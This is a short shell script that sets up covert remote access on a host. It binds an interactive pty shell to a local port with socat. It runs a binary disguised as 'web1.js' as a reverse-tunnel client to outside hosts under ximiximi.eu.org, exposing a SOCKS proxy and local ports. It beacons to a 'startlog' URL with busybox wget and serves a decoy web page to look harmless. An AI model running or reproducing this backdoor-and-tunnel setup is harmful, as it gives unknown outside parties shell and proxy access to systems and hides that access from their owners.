chmod +x web1.js
chmod +x socat
chmod +x busybox
./socat TCP-LISTEN:9999,fork,reuseaddr,bind=127.0.0.1  EXEC:"sh -li",stderr,pty,setsid,ctty 2>&1 &
./web1.js client --keepalive 55s --max-retry-interval 60s http://oa1.ximiximi.eu.org:2052 R:2443:socks R:127.0.0.1:10000:127.0.0.1:10000 R:127.0.0.1:10001:127.0.0.1:10001 >/dev/null 2>&1 &
./web1.js client --keepalive 55s --max-retry-interval 60s http://oa2.ximiximi.eu.org:2052 R:2443:socks >/dev/null 2>&1 &
./busybox sh pulseloop.sh >/dev/null 2>&1 &
./busybox wget -O - http://www.ximiximi.eu.org/startlog >/dev/null 2>&1 &

mkdir /tmp/www
touch /tmp/www/WORK_IN_PROGRESS

filename=$(date +%Y-%m-%d-%H-%M-%S)
echo $filename > /tmp/logname

python -u -m http.server -d /tmp/www

#python -u -m http.server -d /tmp/www >>/tmp/$filename 2>&1 &

./socat open:/tmp/logname TCP-LISTEN:10000,fork,reuseaddr,bind=127.0.0.1 &
./socat open:/tmp/$filename TCP-LISTEN:10001,fork,reuseaddr,bind=127.0.0.1 &

wait


